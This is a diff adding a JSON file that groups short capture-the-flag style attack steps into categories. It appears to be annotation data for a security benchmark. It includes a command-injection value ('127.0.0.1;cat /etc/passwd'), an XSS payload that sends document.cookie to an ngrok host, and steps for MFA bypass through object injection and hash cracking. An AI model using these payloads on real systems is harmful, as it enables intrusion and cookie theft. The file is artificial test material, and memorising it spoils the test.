@@ -1,0 +1,49 @@
+{
+    "URL Manipulation": [
+        "Build URL",
+        "Point the 'screenshotter' service to the deployed page.",
+        "Set 'host' parameter in URL to '127.0.0.1;cat /etc/passwd'.",
+        "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'"
+    ],
+    "SQL Injection": [
+        "Crafted an SQL query for 'valid' result set.",
+        "Understood how MySQL executes query portions inside comments."
+    ],
+    "File Manipulation": [
+        "Find the file named 'flag.txt'.",
+        "Read the file '/etc/passwd'.",
+        "Access otherwise forbidden files",
+        "Found '/opt/yarn-v1.22.19/preinstall.js' in the container."
+    ],
+    "Web Navigation": [
+        "Access the newly public gallery.",
+        "Visit the website."
+    ],
+    "Source Code Analysis": [
+        "View the page source",
+        "Observe the 'get_user_info' method during authentication in the User class.",
+        "Identified vulnerabilities in the PHP source code.",
+        "Analyze how $$ variable is used in the code"
+    ],
+    "Authentication": [
+        "Successfully extract the password token.",
+        "Utilize object injection to manipulate 'mfa' and '_correctValue' variables to be equal.",
+        "Authenticated as admin and explored login.php",
+        "Understand the deserialization of the added cookie into an 'access_log' object",
+        "Capture the login request.",
+        "Identify the existing user 'bob' from the authentication response"
+    ],
+    "Exploitation Techniques": [
+        "Crafted another request smuggling attack.",
+        "Crack the md5 hashes.",
+        "Include the manipulated cookie in the request's header.",
+        "Write an exploit script that creates an object with properties : 'username', 'password', '_correctValue' and 'mfa'. 'username' and 'password' are provided. '_correctValue' is set to NULL and 'mfa' is assigned the address of '_correctValue'. This ensures that 'mfa' and '_correctValue' are always identical."
+    ],
+    "Client-Side Vulnerabilities": [
+        "Note the blacklisted characters.",
+        "Change the User-Agent header in the request"
+    ],
+    "Secure Communication": [
+        "Message is only sent to the intended receiver"
+    ]
+}
